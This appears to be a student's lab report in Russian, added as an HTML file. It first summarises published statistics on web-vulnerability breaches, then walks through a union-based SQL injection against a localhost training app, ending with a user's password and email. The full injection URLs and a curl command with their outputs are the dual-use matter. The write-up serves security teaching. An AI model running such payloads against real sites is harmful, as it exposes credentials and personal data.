@@ -1,0 +1,257 @@
+<!doctype html>
+<html lang="ru">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>svg_format</title>
+  <style>
+    body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Ubuntu, 'Noto Sans', Arial, sans-serif; margin: 32px; line-height: 1.55; }
+    code, pre { font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, 'Liberation Mono', monospace; }
+    pre { padding: 12px; border: 1px solid #ddd; border-radius: 8px; overflow-x: auto; }
+    table { border-collapse: collapse; width: 100%; }
+    th, td { border: 1px solid #ddd; padding: 8px 10px; }
+  </style>
+</head>
+<body>
+<h1>Лабораторная Работа №1</h1>
+<p><em>Черных Богдан Игоревич ' БИВТ-24-9</em></p>
+<h1>Часть 1</h1>
+<p>Задание - " <em>Для I части дз необходимо почитать исследовательские отчеты в российских и зарубежных источниках. Источники вы должны найти сами</em></p>
+<ol>
+<li>ссылки на источники</li>
+<li>доля успешных атак на организации, проведенных с помощью эксплуатации вебуязвимостей</li>
+<li>распределение по конкретным уязвимостям.</li>
+</ol>
+<p><em>Если по разным источникам данные рознятся, можете указать scope, для которого проводилось исследование (например, для гос организаций - такой-то процент, для ITкомпаний - такой-то).</em></p>
+<p><em>За эту часть задания дается 4 балла</em> "</p>
+<h2>Пункт 1. Ссылка на источники</h2>
+<ul>
+<li><a href="https://owasp.org/Top10/2025/">https://owasp.org/Top10/2025/</a></li>
+<li><a href="https://www.verizon.com/business/resources/reports/2025-dbir-executive-summary.pdf">https://www.verizon.com/business/resources/reports/2025-dbir-executive-summary.pdf</a></li>
+<li><a href="https://www.bosconsulting.lt/reports/ibm-x-force-threat-intelligence-index-2025-report.pdf">https://www.bosconsulting.lt/reports/ibm-x-force-threat-intelligence-index-2025-report.pdf</a></li>
+<li><a href="https://ptsecurity.com/about/news/pt-named-weaknesses-in-cyber-defense-of-companies/">https://ptsecurity.com/about/news/pt-named-weaknesses-in-cyber-defense-of-companies/</a></li>
+<li><a href="https://rt-solar.ru/analytics/reports/5375/">https://rt-solar.ru/analytics/reports/5375/</a></li>
+</ul>
+<h2>Пункт 2. Доля успешных атак на огранизации, проведенных с помощью эксплуатации вебуязвимостей</h2>
+<h3>A. Verizon DBIR</h3>
+<p>Verizon DBIR 2025 в своем глобальном отчете показывает, что эксплуатация веб-уязвимостей достигла 20% всех подтвержденных сценариев компрометации, при этом показатель вырос примерно на 34% по сравнению с прошлым годом.</p>
+<h3>B. Positive Technologies</h3>
+<p>По данным нашей (российской) компании Positive Technologies самым распространенным способом проникновения в корпоративную является эксплуатация уязвимостей в веб-приложениях, доступных с внешнего периметра, доля составляет 36%.</p>
+<h3>С. IBM</h3>
+<p>По данным IBM X-Force в организациях критической инфраструктуры эксплуатация доступных извне приложений составила 33% способов первоначального проникновения, в четверти атак на объекты критической инфраструктуры причиной становилась  эксплуатация веб-уязвимостей.</p>
+<h2>Пункт 3. Распределение по конкретным уязвимостям</h2>
+<p>Данные из OWASP Top10 за 2025 год</p>
+<ul>
+<li><em>AIR - Average Incidence Rate - показывает, насколько часто в среднем уязвимости этой категории встречались в исследованной выборке приложений.</em></li>
+<li><em>AC - Average Coverage - в какой доле приложений вообще была найдена хотя бы одна такая уязвимость.</em></li>
+<li><em>TO - Total Occurences - сколько всего таких обнаружений суммарно зафиксировано по всей выборке OWASP.</em></li>
+</ul>
+<table>
+<thead>
+<tr>
+<th>Категория</th>
+<th>AIR</th>
+<th>AC</th>
+<th>TO</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Broken Access Control</td>
+<td>3.74%</td>
+<td>42.93%</td>
+<td>1,839,701</td>
+</tr>
+<tr>
+<td>Security Misconfiguration</td>
+<td>3.00%</td>
+<td>52.35%</td>
+<td>719,084</td>
+</tr>
+<tr>
+<td>Software Supply Chain Failures</td>
+<td>5.72%</td>
+<td>27.47%</td>
+<td>215,248</td>
+</tr>
+<tr>
+<td>Cryptographic Failures</td>
+<td>3.80%</td>
+<td>47.74%</td>
+<td>1,665,348</td>
+</tr>
+<tr>
+<td>Injection</td>
+<td>3.08%</td>
+<td>42.93%</td>
+<td>1,404,249</td>
+</tr>
+<tr>
+<td>Insecure Design</td>
+<td>1.86%</td>
+<td>35.18%</td>
+<td>729,882</td>
+</tr>
+<tr>
+<td>Authentication Failures</td>
+<td>2.92%</td>
+<td>37.14%</td>
+<td>1,120,673</td>
+</tr>
+<tr>
+<td>Software or Data Integrity Failures</td>
+<td>2.75%</td>
+<td>45.49%</td>
+<td>501,327</td>
+</tr>
+<tr>
+<td>Security Logging &amp; Alerting Failures</td>
+<td>3.91%</td>
+<td>46.48%</td>
+<td>260,288</td>
+</tr>
+<tr>
+<td>Mishandling of Exceptional Conditions</td>
+<td>2.95%</td>
+<td>37.95%</td>
+<td>769,581</td>
+</tr>
+</tbody>
+</table>
+<h1>Часть 2</h1>
+<p><em>Задания - "1. узнать пароль пользователя с ником Volk2; 2. узнать почту пользователя с ником Vinni-pukh"</em></p>
+<p>"Введите в качестве параметра ваш id" - Сначала подумал, что ид должен быть где-то в задании записан, или в группе исада где-нибудь, потом понял что это так не работает и просто нужно вводить что-угодно.</p>
+<p>Сначала ввел</p>
+<pre><code class="language-http">http://localhost:8080/task/?id=27
+</code></pre>
+<ul>
+<li>пустой вывод, шикарно.</li>
+</ul>
+<p>В итоге методом от противного дошел до</p>
+<pre><code class="language-http">http://localhost:8080/task/?id=10
+</code></pre>
+<ul>
+<li>все равно пустой ввод.</li>
+</ul>
+<p>А вот уже</p>
+<pre><code class="language-http">http://localhost:8080/task/?id=9
+</code></pre>
+<ul>
+<li>это уже Непустой ввод, точнее ""Ваш id:9; Ваш логин:Volk2"".</li>
+</ul>
+<p>Я правда не сразу обнаружил что Volk2, точнее даже понял что он мне и нужен, и в итоге просто доскипал до id=1 а потом уже осенило, что я чет не туда пошел. И еще пролистыванием от id=1 до id=9 запомнил что идентификаторов всего 9 штук (n=9).<br />
+Значит у Volk2 id=9.</p>
+<p>Интиутивная проверка на уязвимость простой инъекцией, ну точнее добавлением " ' " в конце реквеста:</p>
+<pre><code class="language-http">http://localhost:8080/task/?id=9%27
+</code></pre>
+<p>Вижу</p>
+<pre><code class="language-text">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''9'' LIMIT 0,1' at line 1
+</code></pre>
+<p>следовательно добавленная кавычка вызвала синтаксическую ошибку у MySQL, это означает что присутствует уязвимость типа SQL инъекции.</p>
+<p>Потом пошел определить сколько столбцов у нас в бд. Если что запросы немного мусорные будут прикрепляться с %, но я вводил в более удобном формате, просто перекопировать обратно очень неудобно.</p>
+<p>Попробовал</p>
+<pre><code class="language-http">http://localhost:8080/task/?id=09%27%20order%20by%2010%20--+
+</code></pre>
+<ul>
+<li>"Unknown column '10' in 'order clause'", окей, у нас меньше 10 столбцов.</li>
+</ul>
+<pre><code class="language-http">http://localhost:8080/task/?id=09%27%20order%20by%205%20--+
+</code></pre>
+<ul>
+<li>"Unknown column '5' in 'order clause'", меньше пяти.</li>
+</ul>
+<pre><code class="language-http">http://localhost:8080/task/?id=09%27%20order%20by%204%20--+
+</code></pre>
+<ul>
+<li>"Unknown column '4' in 'order clause'", меньше четырех.</li>
+</ul>
+<pre><code class="language-http">http://localhost:8080/task/?id=09%27%20order%20by%203%20--+
+</code></pre>
+<ul>
+<li>"Ваш id:9 Ваш логин:Volk2", О значит у нас 3 столбца отлично.</li>
+</ul>
+<p>Дальше по логике очевидно хотелось бы узнать Имя у нашей базы данных.<br />
+Начал с</p>
+<pre><code class="language-http">http://localhost:8080/task/?id=9%27%20union%20select%201,database(),3%20--+
+</code></pre>
+<ul>
+<li>"Ваш id:9 Ваш логин:Volk2".</li>
+</ul>
+<pre><code class="language-http">http://localhost:8080/task/?id=27%27%20union%20select%201,database(),3%20--+
+</code></pre>
+<ul>
+<li>"Ваш id:1 Ваш логин:security", окей.</li>
+</ul>
+<p>Базово через</p>
+<pre><code class="language-bash">curl -s &quot;http://localhost:8080/task/?id=27'+UNION+SELECT+1,GROUP_CONCAT(table_name+SEPARATOR+','),3+FROM+information_schema.tables+WHERE+table_schema=database()--+-&quot;
+</code></pre>
+<p>(уже в консоли, потому что пытался сделать через поисковую строку но один раз не заработало, второй, и подумал через консоль тогда уж должно) узнаю все таблицы в бд -</p>
+<pre><code class="language-html">&lt;head&gt;
+&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;
+&lt;title&gt;SQLi task&lt;/title&gt;
+&lt;/head&gt;
+
+&lt;body&gt;
+&lt;div&gt;
+
+
+
+
+
+Ваш id:1&lt;br&gt;Ваш логин:emails,users&lt;/div&gt;&lt;/br&gt;&lt;/br&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+<p>Значит Всего существует emails и users, негусто.</p>
+<p>Раз знаю таблицы грех не узнать столбцы, точнее их названия.</p>
+<pre><code class="language-http">http://localhost:8080/task/?id=27%27%20union%20select%201,group_concat(column_name),3%20from%20information_schema.columns%20where%20table_name=%27users%27%20--+
+</code></pre>
+<ul>
+<li>"Ваш id:1 Ваш логин:USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS,id,username,password"</li>
+</ul>
+<pre><code class="language-http">http://localhost:8080/task/?id=27%27%20union%20select%201,group_concat(column_name),3%20from%20information_schema.columns%20where%20table_name=%27emails%27%20--+
+</code></pre>
+<ul>
+<li>"Ваш id:1 Ваш логин:id,email_id".</li>
+</ul>
+<p>Сначала я подумал лишний раз в файл задания не смотреть, там вроде пароль волка надо было найти, ну я вот и ввел -</p>
+<pre><code class="language-http">http://localhost:8080/task/?id=27%27%20union%20select%201,password,3%20from%20users%20where%20username=%27Volk%27%20--+
+</code></pre>
+<p>Получил "Ваш id:1 Ваш логин:nu zayzc, nu pogodi!".</p>
+<p>Вот, а потом уже на следующий день перед отправкой увидел, что Volk2 а не Volk обычный нужен был, а я уже и забыл что их там двое в бд. Ну и да.</p>
+<pre><code class="language-http">http://localhost:8080/task/?id=27%27%20union%20select%201,password,3%20from%20users%20where%20username=%27Volk2%27%20--+
+</code></pre>
+<ul>
+<li>выдало "Ваш id:1 Ваш логин:Wa spoiuuuuu". Значит ответ на первое задание - 🔹"Wa spoiuuuuu"🔹, т.е. пароль волка2.</li>
+</ul>
+<p>Так как я уже ранее делал запросы на названия столбцов в emails, я уже знаю что там только id и email_id. Главное, что я либо снова забыл либо и не видел какой айди у винипуха, поэтому нахожу базовыми реквестами.</p>
+<pre><code class="language-http">http://localhost:8080/task/?id=1
+</code></pre>
+<ul>
+<li>не он.</li>
+</ul>
+<pre><code class="language-http">http://localhost:8080/task/?id=2
+</code></pre>
+<ul>
+<li>не он.</li>
+</ul>
+<pre><code class="language-http">http://localhost:8080/task/?id=3
+</code></pre>
+<ul>
+<li>не он.</li>
+</ul>
+<pre><code class="language-http">http://localhost:8080/task/?id=4
+</code></pre>
+<ul>
+<li>"Ваш id:4 Ваш логин:Vinni-pukh" вот и нашли.</li>
+</ul>
+<p>Тогда чтобы найти почту винипуха юзаю</p>
+<pre><code class="language-http">http://localhost:8080/task/?id=27%27%20union%20select%201,email_id,3%20from%20emails%20where%20id=4%20--+
+</code></pre>
+<p>и получаю "Ваш id:1 Ваш логин:<a href="mailto:honey_lover@otus-lab.com">honey_lover@otus-lab.com</a>". Значит ответ на второе задание - 🔹"<a href="mailto:honey_lover@otus-lab.com">honey_lover@otus-lab.com</a>"🔹, т.е. электронная почта винипуха.</p>
+<h1>Ответы</h1>
+<p>2 Часть</p>
+<p>✔️ "пароль пользователя с ником Volk2" = <strong>Wa spoiuuuuu</strong><br />
+✔️ "почта пользователя с ником Vinni-pukh" = <strong>honey_lover@otus-lab.com</strong></p>
+</body>
+</html>
